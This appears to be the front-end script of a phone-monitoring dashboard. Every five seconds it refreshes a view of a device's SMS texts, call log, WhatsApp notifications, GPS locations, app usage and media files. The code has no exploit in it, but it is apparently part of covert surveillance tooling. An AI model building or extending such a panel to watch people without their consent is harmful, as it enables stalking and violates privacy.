async function fetchJSON(path) {
    try {
        const res = await fetch(path);
        if (!res.ok) return [];
        return res.json();
    } catch (e) {
        console.error('fetch error', e);
        return [];
    }
}

async function render() {
    const sms = await fetchJSON('/api/sms');
    const smsList = document.getElementById('smsList');
    smsList.innerHTML = '';
    sms.forEach(s => {
        const li = document.createElement('li');
        li.textContent = `${s.sender}: ${s.message} (${new Date(s.timestamp).toLocaleString()})`;
        smsList.appendChild(li);
    });

    const calls = await fetchJSON('/api/call');
    const callsList = document.getElementById('callsList');
    callsList.innerHTML = '';
    calls.forEach(c => {
        const li = document.createElement('li');
        li.textContent = `${c.number} - ${c.state} (${new Date(c.timestamp).toLocaleString()})`;
        callsList.appendChild(li);
    });

    const notifs = await fetchJSON('/api/whatsapp');
    const notifList = document.getElementById('notifList');
    notifList.innerHTML = '';
    notifs.forEach(n => {
        const li = document.createElement('li');
        li.textContent = `${n.packageName}: ${n.message} (${new Date(n.timestamp).toLocaleString()})`;
        notifList.appendChild(li);
    });

    const locs = await fetchJSON('/api/location');
    const locList = document.getElementById('locList');
    locList.innerHTML = '';
    locs.forEach(l => {
        const li = document.createElement('li');
        li.textContent = `${l.lat.toFixed(5)}, ${l.lon.toFixed(5)} (acc ${l.accuracy}) - ${new Date(l.timestamp).toLocaleString()}`;
        locList.appendChild(li);
    });

    const usage = await fetchJSON('/api/app-usage');
    const usageList = document.getElementById('usageList');
    usageList.innerHTML = '';
    usage.forEach(u => {
        const li = document.createElement('li');
        li.textContent = `${u.packageName}: ${u.totalTime}ms (last ${new Date(u.lastTimeUsed).toLocaleString()})`;
        usageList.appendChild(li);
    });

    const media = await fetchJSON('/api/media');
    const mediaList = document.getElementById('mediaList');
    mediaList.innerHTML = '';
    media.forEach(m => {
        const li = document.createElement('li');
        const a = document.createElement('a');
        a.href = '/api/media/' + m._id;
        a.textContent = m.filename || m.originalname || m._id;
        a.target = '_blank';
        li.appendChild(a);
        mediaList.appendChild(li);
    });
}

render();
setInterval(render, 5000);
